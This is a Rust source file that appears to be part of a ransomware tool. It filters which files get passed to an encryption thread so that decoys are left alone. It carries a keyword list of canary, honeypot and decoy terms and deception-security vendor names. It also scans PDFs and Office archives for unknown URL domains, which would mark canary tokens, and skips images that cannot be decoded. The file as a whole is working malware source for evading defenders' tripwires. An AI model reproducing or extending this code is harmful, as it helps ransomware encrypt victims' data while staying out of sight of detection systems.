use std::{
    io::{self, Cursor, Read},
    path::{Path, PathBuf},
    sync::{Arc, LazyLock},
    thread::{self, JoinHandle},
};

use anyhow::Context;
use coconut_crab_lib::file::read_file_data;
use flume::{Receiver, Sender};
use regex::bytes::{Regex, RegexSet};
use tracing::{debug, error, info};
use zip::read::ZipArchive;

use crate::{client::recv_path, config, img::img_from_bytes};

static INTERESTING_STRING_REGEX: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"[A-Za-z0-9:./-]{6,}").expect("Invalid Regex"));
static LOOSE_URL_REGEX: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i-u)https?://(?:[^.]+\.+)*([^.]+\.[^./]+)").expect("Invalid Regex")
});
static SUSPICIOUS_KEYWORD_SET: LazyLock<RegexSet> = LazyLock::new(|| {
    RegexSet::new(
        SUSPICIOUS_KEYWORDS
            .iter()
            .map(|keyword| format!("(?i-u){}", regex::escape(keyword))),
    )
    .expect("Invalid RegexSet")
});
pub static SUSPICIOUS_KEYWORDS: LazyLock<[String; 25]> = LazyLock::new(|| {
    [
        lc!("canary"),
        lc!("canaries"),
        lc!("honeypot"),
        lc!("honeytoken"),
        lc!("honeyfile"),
        lc!("honeydoc"),
        lc!("decoy"),
        lc!("ransomware"),
        lc!("thinkst"),
        lc!("includepicture"),
        lc!("huntress"),
        lc!("exampleit"),
        lc!("james brodsky"),
        lc!("splunk"),
        lc!("stressboi"),
        lc!("genie9"),
        lc!("bigmind"),
        lc!("nccgroup"),
        lc!("attivo"),
        lc!("threatwise"),
        lc!("acalvio"),
        lc!("trapx"),
        lc!("illusive"),
        lc!("countercraft"),
        lc!("varonis"),
    ]
});

const OFFICE_FILE_DOMAINS: [&str; 4] =
    ["microsoft.com", "openxmlformats.org", "w3.org", "purl.org"];
const OFFICE_ZIP_EXTENSIONS: [&str; 4] = ["zip", "docx", "xlsx", "pptx"];
const IMAGE_EXTENSIONS: [&str; 17] = [
    "avif", "bmp", "dds", "ff", "gif", "hdr", "ico", "jpg", "jpeg", "exr", "png", "pnm", "qoi",
    "tga", "tiff", "tif", "webp",
];
const MAX_IMAGE_SIZE_BYTES: u64 = 2 * 1024 * 1024;
const MAX_FILE_SIZE_BYTES: u64 = 1024 * 1024;
const MAX_ZIP_ENTRIES: usize = 4096;
const MAX_ZIP_TOTAL_BYTES: u64 = 8 * 1024 * 1024;

pub const fn canary_active() -> bool {
    config::ANALYZE_PDF || config::ANALYZE_OFFICE_ZIP || config::AVOID_BROKEN_IMAGES
}

pub fn filter_canary(
    receiver: Receiver<Arc<PathBuf>>,
    sender: Sender<Arc<PathBuf>>,
) -> io::Result<JoinHandle<()>> {
    debug!("Starting canary filter thread");
    thread::Builder::new().spawn(move || {
        loop {
            let Some(file_path) = recv_path(&receiver) else {
                return;
            };

            if config::AVOID_KEYWORDS && analyze_keywords(&file_path.to_string_lossy()) {
                info!(path = %file_path.display(), "File path contained keyword");
                continue;
            }

            let extension = file_path.extension().and_then(|ext| ext.to_str());
            if config::ANALYZE_PDF && extension.is_some_and(|ext| ext.eq_ignore_ascii_case("pdf")) {
                filter_pdf(&sender, &file_path);
            } else if config::ANALYZE_OFFICE_ZIP
                && extension.is_some_and(|ext| {
                    OFFICE_ZIP_EXTENSIONS
                        .iter()
                        .any(|allowed| ext.eq_ignore_ascii_case(allowed))
                })
            {
                filter_office_zip(&sender, &file_path);
            } else if config::AVOID_BROKEN_IMAGES
                && extension.is_some_and(|ext| {
                    IMAGE_EXTENSIONS
                        .iter()
                        .any(|allowed| ext.eq_ignore_ascii_case(allowed))
                })
            {
                filter_broken_image(&sender, &file_path);
            } else {
                forward(&sender, &file_path, "no analysis applicable");
            }
        }
    })
}

fn forward(sender: &Sender<Arc<PathBuf>>, file_path: &Arc<PathBuf>, reason: &str) {
    debug!(path = %file_path.display(), reason, "Forwarding for encryption");
    if let Err(error) = sender.send(Arc::clone(file_path)) {
        error!(error = ?error, "Failed to send path to encryption thread");
    }
}

fn read_capped_or_forward(
    sender: &Sender<Arc<PathBuf>>,
    file_path: &Arc<PathBuf>,
    max_size: u64,
    unreadable_reason: &str,
    oversize_reason: &str,
) -> Option<Vec<u8>> {
    match read_file_data(file_path.as_ref(), max_size) {
        Ok(Some(data)) => Some(data),
        Ok(None) => {
            forward(sender, file_path, oversize_reason);
            None
        }
        Err(error) => {
            error!(error = ?error, "Error during file data retrieval");
            forward(sender, file_path, unreadable_reason);
            None
        }
    }
}

fn filter_pdf(sender: &Sender<Arc<PathBuf>>, file_path: &Arc<PathBuf>) {
    let Some(file_data) = read_capped_or_forward(
        sender,
        file_path,
        MAX_FILE_SIZE_BYTES,
        "unreadable pdf",
        "oversize pdf",
    ) else {
        return;
    };

    if analyze_file_data(&file_data, config::AVOID_KEYWORDS, config::AVOID_URLS) {
        info!(
            path = %file_path.display(),
            "File flagged by analysis. Not sending file for encryption"
        );
    } else {
        forward(sender, file_path, "clean pdf");
    }
}

fn filter_office_zip(sender: &Sender<Arc<PathBuf>>, file_path: &Arc<PathBuf>) {
    let Some(data) = read_capped_or_forward(
        sender,
        file_path,
        MAX_FILE_SIZE_BYTES,
        "unreadable zip",
        "oversize zip",
    ) else {
        return;
    };

    match analyze_zip_bytes(
        &data,
        file_path.as_ref(),
        MAX_FILE_SIZE_BYTES,
        config::AVOID_KEYWORDS,
        config::AVOID_URLS,
    ) {
        Ok(true) => {
            info!(
                path = %file_path.display(),
                "File flagged by analysis. Not sending file for encryption"
            );
        }
        Ok(false) => {
            forward(sender, file_path, "clean zip");
        }
        Err(error) => {
            error!(error = ?error, "Error analyzing zip file");
            forward(sender, file_path, "unanalyzable zip");
        }
    }
}

fn filter_broken_image(sender: &Sender<Arc<PathBuf>>, file_path: &Arc<PathBuf>) {
    let Some(file_data) = read_capped_or_forward(
        sender,
        file_path,
        MAX_IMAGE_SIZE_BYTES,
        "unreadable image",
        "oversize image",
    ) else {
        return;
    };

    if img_from_bytes(&file_data).is_ok() {
        forward(sender, file_path, "decodable image");
    } else {
        info!(path = %file_path.display(), "Not sending file for encryption");
    }
}

fn analyze_file_data(file_data: &[u8], avoid_keywords: bool, avoid_urls: bool) -> bool {
    if avoid_keywords && SUSPICIOUS_KEYWORD_SET.is_match(file_data) {
        return true;
    }

    if avoid_urls {
        INTERESTING_STRING_REGEX
            .find_iter(file_data)
            .any(|token| analyze_urls(token.as_bytes()))
    } else {
        false
    }
}

fn analyze_keywords(string: &str) -> bool {
    if SUSPICIOUS_KEYWORD_SET.is_match(string.as_bytes()) {
        info!("String flagged by analysis due to keyword");
        return true;
    }
    debug!(string = %string, "String not flagged by analysis");
    false
}

fn analyze_urls(string: &[u8]) -> bool {
    for capture in LOOSE_URL_REGEX.captures_iter(string) {
        let Some(domain) = capture.get(1) else {
            continue;
        };
        let domain = domain.as_bytes();
        if analyze_domain(domain) {
            info!(
                domain = %String::from_utf8_lossy(domain),
                "URL flagged by analysis due to domain"
            );
            return true;
        }
    }
    debug!("URL not flagged by analysis");
    false
}

fn analyze_domain(domain: &[u8]) -> bool {
    let known = OFFICE_FILE_DOMAINS
        .iter()
        .any(|candidate| candidate.as_bytes().eq_ignore_ascii_case(domain));
    if known {
        debug!(
            domain = %String::from_utf8_lossy(domain),
            "Domain is a known office document domain"
        );
        false
    } else {
        debug!(
            domain = %String::from_utf8_lossy(domain),
            "Domain not a known office document domain"
        );
        true
    }
}

fn analyze_zip_bytes(
    data: &[u8],
    file_path: &Path,
    zipped_file_max_size: u64,
    avoid_keywords: bool,
    avoid_urls: bool,
) -> anyhow::Result<bool> {
    let mut archive = ZipArchive::new(Cursor::new(data)).with_context(|| {
        format!(
            "failed to open file as zip archive: {}",
            file_path.display()
        )
    })?;

    debug!(entries = archive.len(), "Zip archive opened");
    if archive.len() > MAX_ZIP_ENTRIES {
        debug!(
            entries = archive.len(),
            limit = MAX_ZIP_ENTRIES,
            path = %file_path.display(),
            "Truncating zip analysis"
        );
    }
    let mut total_analyzed: u64 = 0;
    for zipped_file_num in 0..archive.len().min(MAX_ZIP_ENTRIES) {
        if total_analyzed >= MAX_ZIP_TOTAL_BYTES {
            debug!(
                budget = MAX_ZIP_TOTAL_BYTES,
                path = %file_path.display(),
                "Zip analysis total budget reached, stopping fail-open"
            );
            break;
        }
        let mut entry = archive.by_index(zipped_file_num).with_context(|| {
            format!(
                "failed to open zipped file {zipped_file_num} of {}",
                file_path.display()
            )
        })?;

        if entry.size() <= zipped_file_max_size {
            debug!(
                size = entry.size(),
                max = zipped_file_max_size,
                "Entry size below max analysis size"
            );

            let prealloc = entry.size().min(zipped_file_max_size);
            let mut zipped_file_data = Vec::with_capacity(usize::try_from(prealloc).unwrap_or(0));
            entry
                .by_ref()
                .take(zipped_file_max_size.saturating_add(1))
                .read_to_end(&mut zipped_file_data)
                .with_context(|| {
                    format!(
                        "failed to read zipped file: {}",
                        String::from_utf8_lossy(entry.name_raw())
                    )
                })?;
            debug!(
                bytes = zipped_file_data.len(),
                entry = %String::from_utf8_lossy(entry.name_raw()),
                "Successfully read zipped file"
            );

            let zipped_len = u64::try_from(zipped_file_data.len()).unwrap_or(u64::MAX);
            if zipped_len > zipped_file_max_size {
                debug!(
                    size = zipped_file_data.len(),
                    max = zipped_file_max_size,
                    entry = %String::from_utf8_lossy(entry.name_raw()),
                    "Entry decompressed beyond max size, skipping"
                );
                continue;
            }
            total_analyzed += zipped_len;

            if analyze_file_data(&zipped_file_data, avoid_keywords, avoid_urls) {
                info!(
                    entry = %String::from_utf8_lossy(entry.name_raw()),
                    "Zipped file flagged by analysis"
                );
                return Ok(true);
            }
        } else {
            debug!(
                size = entry.size(),
                max = zipped_file_max_size,
                "Entry size above max analysis size"
            );
        }
    }
    debug!(path = %file_path.display(), "Zip archive not flagged by analysis");
    Ok(false)
}
